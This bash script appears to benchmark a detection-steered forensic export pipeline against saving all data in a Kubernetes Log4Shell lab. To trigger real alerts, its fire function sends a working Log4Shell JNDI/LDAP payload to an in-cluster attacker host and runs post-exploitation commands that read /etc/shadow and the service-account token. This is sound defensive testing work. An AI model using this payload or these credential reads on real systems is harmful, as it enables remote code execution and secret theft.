#!/usr/bin/env bash
# exp_dx_steering_reduction.sh — datavolume REDUCTION of DX-steered AE vs saving ALL data.
#
# Two arms, SAME fixed load, back-to-back, measured as forensic_db active-part
# deltas (rows + on-disk compressed bytes) per table:
#
#   ALL  — AE passthrough firehose (ADAPTIVE_PASSTHROUGH=true): every pod, every
#          table, the whole window. This is the "save everything" baseline.
#   DX   — AE rev-3 streaming (ADAPTIVE_WRITE_MODE=streaming): AE writes ONLY the
#          pods DX has steered into its activeSet over the control surface
#          (CONTROL_ADDR). DX (dx-daemon) classifies the live anomaly and calls
#          AE /export/start for the implicated pod(s) only.
#
#   reduction = 1 - (DX bytes / ALL bytes)   ← the AdaptiveExport value prop.
#
# Runs NODE-SIDE on the rig dev-machine (kubectl is local). Prereqs:
#   - DX steering wired: AE CONTROL_ADDR=:9100 + node-local Service
#     adaptive-export-control:9100 + dx AE_CONTROL_ADDR pointing at it.
#   - live kubescape + a vulnerable backend so the fire produces a real anomaly
#     DX can classify (log4shell-rce-exfil). Uses the CANONICAL resolvable FQDN
#     (a malformed one → NXDOMAIN → R0005 dropped → DX never steers).
set -uo pipefail
NS=log4j-poc; CHPOD=chi-forensic-soc-db-soc-cluster-0-0-0
WIN=${WIN:-180}; WARM=${WARM:-45}; OUT=/tmp/dx_vs_all.txt
TABLES="http_events dns_events conn_stats pgsql_events"
chq(){ kubectl -n clickhouse exec "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
snap(){ chq "SELECT table, sum(rows), sum(data_compressed_bytes) FROM system.parts WHERE database='forensic_db' AND active AND table IN ('http_events','dns_events','pgsql_events','conn_stats') GROUP BY table FORMAT TSV"; }

FE=$(kubectl -n $NS get svc frontend -o jsonpath='{.spec.clusterIP}' 2>/dev/null)
FEP=$(kubectl -n $NS get svc frontend -o jsonpath='{.spec.ports[0].port}' 2>/dev/null)
BIP=$(kubectl -n $NS get svc backend -o jsonpath='{.spec.clusterIP}' 2>/dev/null)
BPORT=$(kubectl -n $NS get svc backend -o jsonpath='{.spec.ports[0].port}' 2>/dev/null)
# CANONICAL resolvable JNDI FQDN — fires the chain (marshalsec) so DX can classify.
JNDI='${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}'
echo "fe=$FE:$FEP backend=$BIP:$BPORT win=${WIN}s warm=${WARM}s $(date -u +%H:%M:%S)" | tee "$OUT"

# Steady ambient load on log4j-poc so both arms see the SAME baseline traffic.
for i in $(seq 1 6); do kubectl -n $NS delete pod cl-$i --ignore-not-found --wait=false >/dev/null 2>&1; done
for i in $(seq 1 6); do kubectl -n $NS run cl-$i --image=busybox:1.36 --labels=run=cldx --restart=Never -- \
  sh -c "while true; do wget -qO- http://$FE:$FEP/api/products?q=l$i >/dev/null 2>&1; done" >/dev/null 2>&1; done

# Two-stage attack signal. Stage-1 (JNDI/LDAP) alone does NOT make kubescape flag
# the backend → DX gets no case → no steer. The R0001/R0006 that DX rules on come
# from stage-2 (post-exploitation exec). Fire BOTH so DX rules the backend
# MALIGNANT and it enters AE's activeSet. (Learned the hard way: JNDI-only = no
# R0001 = DX indeterminate; cf. SHELLS_CAPTURE_RCA / lab redis exfil example.)
fire(){
  kubectl -n attacker-ns exec deploy/attacker -- curl -s -m4 -A "$JNDI" "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true
  local bp; bp=$(kubectl -n "$NS" get pods --no-headers 2>/dev/null | awk '/^backend/{print $1;exit}')
  [ -n "$bp" ] && kubectl -n "$NS" exec "$bp" -- sh -c 'whoami; cat /etc/shadow 2>&1 | head -1; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 10; getent hosts attacker.attacker-ns.svc.cluster.local' >/dev/null 2>&1 || true
}

run_arm(){ local name="$1"; shift
  echo "=== ARM $name: $* ===" | tee -a "$OUT"
  kubectl -n pl set env ds/adaptive-export "$@" >/dev/null 2>&1
  kubectl -n pl rollout status ds/adaptive-export --timeout=140s >/dev/null 2>&1
  sleep "$WARM"
  declare -A R0 B0; while IFS=$'\t' read -r t r b; do R0[$t]=$r; B0[$t]=$b; done < <(snap)
  local s0; s0=$(date +%s); local end=$(( s0 + WIN ))
  while [ "$(date +%s)" -lt "$end" ]; do fire; sleep 6; done
  sleep 20  # let the last window flush
  echo "  window ${s0}..$(date +%s)" | tee -a "$OUT"
  printf "  %-14s %10s %14s\n" table d_rows d_bytes | tee -a "$OUT"
  : > /tmp/arm_$name.tsv
  while IFS=$'\t' read -r t r b; do
    printf "  %-14s %10d %14d\n" "$t" $(( r-${R0[$t]:-0} )) $(( b-${B0[$t]:-0} )) | tee -a "$OUT"
    printf "%s\t%d\t%d\n" "$t" $(( r-${R0[$t]:-0} )) $(( b-${B0[$t]:-0} )) >> /tmp/arm_$name.tsv
  done < <(snap)
  echo "  active_export_windows=$(chq "SELECT countIf(t_end>now()) FROM forensic_db.adaptive_attribution")" | tee -a "$OUT"
}

# ALL: save everything (passthrough firehose, no gate).
run_arm ALL ADAPTIVE_PASSTHROUGH=true ADAPTIVE_WRITE_MODE= ADAPTIVE_PUSH_PIXIE_ROWS=false

# Clear STALE steering before the DX arm: old adaptive_attribution windows rehydrate
# into the activeSet and make AE stream DEAD pods (run-1 dead-arm bug → false 100%).
chq "ALTER TABLE forensic_db.adaptive_attribution DELETE WHERE 1=1" >/dev/null 2>&1; sleep 3

# DX: rev-3 streaming, DX steers activeSet over the control surface.
run_arm DX  ADAPTIVE_PASSTHROUGH=false ADAPTIVE_WRITE_MODE=streaming ADAPTIVE_PUSH_PIXIE_ROWS=false

# GUARD: the steered pods must be ALIVE + traffic-bearing (else the reduction is a dead arm).
echo "=== DX steered pods (must be LIVE; backend = the attack target) ===" | tee -a "$OUT"
chq "SELECT pod, count() FROM forensic_db.adaptive_attribution WHERE t_end>now() GROUP BY pod ORDER BY pod FORMAT TSV" | tee -a "$OUT"
echo "  marshalsec_fires=$(kubectl -n attacker-ns logs deploy/attacker --since=10m 2>/dev/null | grep -c 'Send LDAP reference')" | tee -a "$OUT"
echo "  live_log4j_pods:" | tee -a "$OUT"; kubectl -n $NS get pods --no-headers 2>/dev/null | awk '{print "    "$1,$3}' | tee -a "$OUT"

echo "=== REDUCTION (1 - DX/ALL) — ROWS primary (compaction-noise-free); bytes secondary ===" | tee -a "$OUT"
printf "  %-13s %9s %9s %8s | %10s %10s %8s\n" table all_rows dx_rows red_row all_bytes dx_bytes red_byt | tee -a "$OUT"
for t in $TABLES; do
  ar=$(awk -v T="$t" '$1==T{print $2}' /tmp/arm_ALL.tsv); ar=${ar:-0}
  dr=$(awk -v T="$t" '$1==T{print $2}' /tmp/arm_DX.tsv);  dr=${dr:-0}
  ab=$(awk -v T="$t" '$1==T{print $3}' /tmp/arm_ALL.tsv); ab=${ab:-0}
  db=$(awk -v T="$t" '$1==T{print $3}' /tmp/arm_DX.tsv);  db=${db:-0}
  rr=$(awk -v a="$ar" -v d="$dr" 'BEGIN{ if(a>0) printf "%.1f%%", (1-d/a)*100; else print "n/a" }')
  rb=$(awk -v a="$ab" -v d="$db" 'BEGIN{ if(a>0) printf "%.1f%%", (1-d/a)*100; else print "n/a" }')
  printf "  %-13s %9d %9d %8s | %10d %10d %8s\n" "$t" "$ar" "$dr" "$rr" "$ab" "$db" "$rb" | tee -a "$OUT"
done
tar=$(awk '{s+=$2} END{print s+0}' /tmp/arm_ALL.tsv); tdr=$(awk '{s+=$2} END{print s+0}' /tmp/arm_DX.tsv)
awk -v a="$tar" -v d="$tdr" 'BEGIN{ printf "  TOTAL rows ALL=%d DX=%d reduction=%.1f%%\n", a, d, (a>0?(1-d/a)*100:0) }' | tee -a "$OUT"

for i in $(seq 1 6); do kubectl -n $NS delete pod cl-$i --ignore-not-found --wait=false >/dev/null 2>&1; done
echo "DONE $(date -u +%H:%M:%S)" | tee -a "$OUT"
